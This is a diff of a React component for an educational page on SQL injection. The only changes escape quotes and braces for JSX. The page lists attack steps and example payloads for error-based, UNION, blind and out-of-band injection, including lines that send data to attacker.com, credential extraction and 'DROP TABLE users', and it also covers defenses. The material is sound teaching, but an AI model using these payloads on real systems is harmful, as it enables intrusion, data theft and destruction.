@@ -24,7 +24,7 @@ const SQLInjection: React.FC = () => {
           
           <Alert className="mb-4 bg-red-50 text-red-900 dark:bg-red-900/20 dark:text-red-200">
             <InfoIcon className="h-4 w-4" />
-            <AlertTitle>Attacker's Goal</AlertTitle>
+            <AlertTitle>Attacker&apos;s Goal</AlertTitle>
             <AlertDescription>
               Extract sensitive data, bypass authentication, modify database content, execute administrative operations on the database,
               recover hidden data, or in some cases, issue commands to the operating system.
@@ -65,7 +65,7 @@ const SQLInjection: React.FC = () => {
           <div className="my-6">
             <h5 className="font-semibold mb-4">SQL Injection Step-by-Step Attack Flow</h5>
             <ol className="list-decimal pl-6 space-y-2">
-              <li><strong>Identification:</strong> Attacker identifies potential SQL injection points by testing inputs with special characters like <code>'</code>, <code>"</code>, <code>;</code>, or <code>--</code></li>
+              <li><strong>Identification:</strong> Attacker identifies potential SQL injection points by testing inputs with special characters like <code>&apos;</code>, <code>&quot;</code>, <code>;</code>, or <code>--</code></li>
               <li><strong>Validation:</strong> If the application returns database errors or behaves unexpectedly, the attacker confirms the vulnerability</li>
               <li><strong>Information Gathering:</strong> Attacker determines database type, table names, and column structures using techniques like UNION attacks or error-based injection</li>
               <li><strong>Exploitation:</strong> With structural information acquired, the attacker crafts queries to extract, modify, or delete data</li>
@@ -93,7 +93,7 @@ const SQLInjection: React.FC = () => {
                     <p className="mb-2">Relies on error messages thrown by the database server to obtain information about the structure of the database.</p>
                     <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                       <p className="mb-1 text-green-400"># Example payload:</p>
-                      <p>' OR 1=CONVERT(int, @@version) --</p>
+                      <p>&apos; OR 1=CONVERT(int, @@version) --</p>
                     </div>
                   </AccordionContent>
                 </AccordionItem>
@@ -103,7 +103,7 @@ const SQLInjection: React.FC = () => {
                     <p className="mb-2">Uses the UNION SQL operator to combine results from the original query with results from an injected query.</p>
                     <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                       <p className="mb-1 text-green-400"># Example payload:</p>
-                      <p>' UNION SELECT 1,username,password,4 FROM users --</p>
+                      <p>&apos; UNION SELECT 1,username,password,4 FROM users --</p>
                     </div>
                   </AccordionContent>
                 </AccordionItem>
@@ -111,16 +111,16 @@ const SQLInjection: React.FC = () => {
             </TabsContent>
             
             <TabsContent value="blind" className="mt-4 space-y-4">
-              <p>Occurs when the application doesn't display database error messages or query results, forcing attackers to use indirect methods.</p>
+              <p>Occurs when the application doesn&apos;t display database error messages or query results, forcing attackers to use indirect methods.</p>
               
               <Accordion type="single" collapsible className="w-full">
                 <AccordionItem value="boolean">
                   <AccordionTrigger className="font-semibold">Boolean-based</AccordionTrigger>
                   <AccordionContent>
-                    <p className="mb-2">Uses true/false questions to extract data by observing differences in the application's response.</p>
+                    <p className="mb-2">Uses true/false questions to extract data by observing differences in the application&apos;s response.</p>
                     <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                       <p className="mb-1 text-green-400"># Example payload:</p>
-                      <p>' OR (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a' --</p>
+                      <p>&apos; OR (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)=&apos;a&apos; --</p>
                     </div>
                   </AccordionContent>
                 </AccordionItem>
@@ -130,7 +130,7 @@ const SQLInjection: React.FC = () => {
                     <p className="mb-2">Uses database time delay functions to extract information when there is no visible output.</p>
                     <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm mt-2">
                       <p className="mb-1 text-green-400"># Example payload (MySQL):</p>
-                      <p>' OR IF(SUBSTRING(username,1,1)='a',SLEEP(5),0) FROM users WHERE id=1 --</p>
+                      <p>&apos; OR IF(SUBSTRING(username,1,1)=&apos;a&apos;,SLEEP(5),0) FROM users WHERE id=1 --</p>
                     </div>
                   </AccordionContent>
                 </AccordionItem>
@@ -142,9 +142,9 @@ const SQLInjection: React.FC = () => {
               
               <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm">
                 <p className="mb-1 text-green-400"># Example payload (Oracle):</p>
-                <p>'; SELECT UTL_HTTP.REQUEST('http://attacker.com/log?data='||banner) FROM v$version --</p>
+                <p>&apos;; SELECT UTL_HTTP.REQUEST(&apos;http://attacker.com/log?data=&apos;||banner) FROM v$version --</p>
                 <p className="mt-2 text-green-400"># Example payload (SQL Server):</p>
-                <p>'; EXEC master..xp_dirtree '\\attacker.com\share' --</p>
+                <p>&apos;; EXEC master..xp_dirtree &apos;\\attacker.com\share&apos; --</p>
               </div>
               <p className="text-sm italic mt-2">This technique relies on specific database features that allow network connections and requires the database server to have outbound network access.</p>
             </TabsContent>
@@ -166,32 +166,32 @@ const SQLInjection: React.FC = () => {
             <TableBody>
               <TableRow>
                 <TableCell className="font-medium">Authentication Bypass</TableCell>
-                <TableCell><code>' OR 1=1 --</code></TableCell>
+                <TableCell><code>&apos; OR 1=1 --</code></TableCell>
                 <TableCell className="hidden md:table-cell">Makes the WHERE condition always true</TableCell>
               </TableRow>
               <TableRow>
                 <TableCell className="font-medium">Database Version</TableCell>
-                <TableCell><code>' UNION SELECT @@version -- </code></TableCell>
+                <TableCell><code>&apos; UNION SELECT @@version -- </code></TableCell>
                 <TableCell className="hidden md:table-cell">Retrieves version information (SQL Server)</TableCell>
               </TableRow>
               <TableRow>
                 <TableCell className="font-medium">Extract Table Names</TableCell>
-                <TableCell><code>' UNION SELECT table_name,2 FROM information_schema.tables --</code></TableCell>
+                <TableCell><code>&apos; UNION SELECT table_name,2 FROM information_schema.tables --</code></TableCell>
                 <TableCell className="hidden md:table-cell">Lists tables from database schema</TableCell>
               </TableRow>
               <TableRow>
                 <TableCell className="font-medium">Extract Column Names</TableCell>
-                <TableCell><code>' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' --</code></TableCell>
+                <TableCell><code>&apos; UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name=&apos;users&apos; --</code></TableCell>
                 <TableCell className="hidden md:table-cell">Lists columns from a specific table</TableCell>
               </TableRow>
               <TableRow>
                 <TableCell className="font-medium">Data Extraction</TableCell>
-                <TableCell><code>' UNION SELECT username,password FROM users --</code></TableCell>
+                <TableCell><code>&apos; UNION SELECT username,password FROM users --</code></TableCell>
                 <TableCell className="hidden md:table-cell">Extracts sensitive data from database</TableCell>
               </TableRow>
               <TableRow>
                 <TableCell className="font-medium">Stacked Queries</TableCell>
-                <TableCell><code>'; DROP TABLE users; --</code></TableCell>
+                <TableCell><code>&apos;; DROP TABLE users; --</code></TableCell>
                 <TableCell className="hidden md:table-cell">Executes multiple SQL statements</TableCell>
               </TableRow>
             </TableBody>
@@ -266,7 +266,7 @@ const user = await prisma.user.findUnique({
             <li>
               <strong>Perform Initial Tests:</strong> Insert characters that may cause SQL syntax errors:
               <ul className="list-disc pl-6 mt-2">
-                <li>Single quote (<code>'</code>) or double quote (<code>"</code>)</li>
+                <li>Single quote (<code>&apos;</code>) or double quote (<code>&quot;</code>)</li>
                 <li>SQL comment sequences (<code>--</code>, <code>#</code>, <code>/**/</code>)</li>
                 <li>Boolean operations (<code>OR 1=1</code>, <code>AND 1=2</code>)</li>
               </ul>
@@ -310,7 +310,7 @@ const user = await prisma.user.findUnique({
             <div className="border p-4 rounded-md">
               <h5 className="font-semibold mb-2">SQLmap</h5>
               <p className="text-sm">Automated SQL injection detection and exploitation tool. Can automatically detect and exploit various types of SQL injection vulnerabilities.</p>
-              <p className="text-xs mt-2 italic">Usage: <code>sqlmap -u "http://example.com/page?id=1" --dbs</code></p>
+              <p className="text-xs mt-2 italic">Usage: <code>sqlmap -u &quot;http://example.com/page?id=1&quot; --dbs</code></p>
             </div>
             <div className="border p-4 rounded-md">
               <h5 className="font-semibold mb-2">Burp Suite</h5>
@@ -339,7 +339,7 @@ const user = await prisma.user.findUnique({
               <p className="text-sm">The most effective defense. Ensures that user input is never treated as part of the SQL command.</p>
               <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                 <p className="text-green-400">// Using parameterized query in Node.js</p>
-                <p>const query = "SELECT * FROM users WHERE username = ? AND password = ?";</p>
+                <p>const query = &quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;;</p>
                 <p>db.execute(query, [username, password]);</p>
               </div>
             </div>
@@ -349,12 +349,12 @@ const user = await prisma.user.findUnique({
               <p className="text-sm">ORMs like Sequelize, Prisma, or Hibernate typically use parameterized queries under the hood.</p>
               <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                 <p className="text-green-400">// Using Prisma ORM</p>
-                <p>const user = await prisma.user.findFirst({</p>
-                <p>  where: {</p>
+                <p>const user = await prisma.user.findFirst({'{'}</p>
+                <p>  where: {'{'}</p>
                 <p>    username: username,</p>
                 <p>    password: hashedPassword</p>
-                <p>  }</p>
-                <p>});</p>
+                <p>  {'}'}</p>
+                <p>{'}'});</p>
               </div>
             </div>
             
@@ -364,9 +364,9 @@ const user = await prisma.user.findUnique({
               <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                 <p className="text-green-400">// Validating numeric input</p>
                 <p>const id = req.params.id;</p>
-                <p>if (!Number.isInteger(parseInt(id))) {</p>
-                <p>  return res.status(400).send('Invalid ID format');</p>
-                <p>}</p>
+                <p>if (!Number.isInteger(parseInt(id))) {'{'}</p>
+                <p>  return res.status(400).send(&apos;Invalid ID format&apos;);</p>
+                <p>{'}'}</p>
               </div>
             </div>
             
@@ -375,8 +375,8 @@ const user = await prisma.user.findUnique({
               <p className="text-sm">Database accounts used by applications should have the minimum necessary privileges.</p>
               <div className="bg-slate-800 text-white p-3 rounded-md overflow-x-auto font-mono text-xs mt-2">
                 <p className="text-green-400">-- Example SQL for creating a restricted user</p>
-                <p>CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';</p>
-                <p>GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';</p>
+                <p>CREATE USER &apos;app_user&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;password&apos;;</p>
+                <p>GRANT SELECT, INSERT, UPDATE ON app_db.* TO &apos;app_user&apos;@&apos;localhost&apos;;</p>
                 <p>-- No DELETE or DROP privileges</p>
               </div>
             </div>
@@ -443,9 +443,9 @@ const user = await prisma.user.findUnique({
               <ul className="list-disc pl-6 space-y-2">
                 <li><strong>MongoDB Injections:</strong> Use of <code>$where</code> clauses with JavaScript</li>
                 <li><strong>JSON Document Attacks:</strong> Parameter manipulation through JSON objects</li>
-                <li><strong>Example Attack:</strong> <code>db.users.find({username: req.body.username, $where: function() { return 1==1; }})</code></li>
+                <li><strong>Example Attack:</strong> <code>db.users.find({'{'}username: req.body.username, $where: function() {'{'} return 1==1; {'}'}{'}'});</code></li>
                 <li><strong>Specific Mitigations:</strong> Avoid directly using user input in query objects, validate strict schemas</li>
-                <li><strong>Prevention:</strong> Use MongoDB's query operators (<code>$eq</code>, <code>$gt</code>) instead of JavaScript expressions</li>
+                <li><strong>Prevention:</strong> Use MongoDB&apos;s query operators (<code>$eq</code>, <code>$gt</code>) instead of JavaScript expressions</li>
               </ul>
             </TabsContent>
           </Tabs>
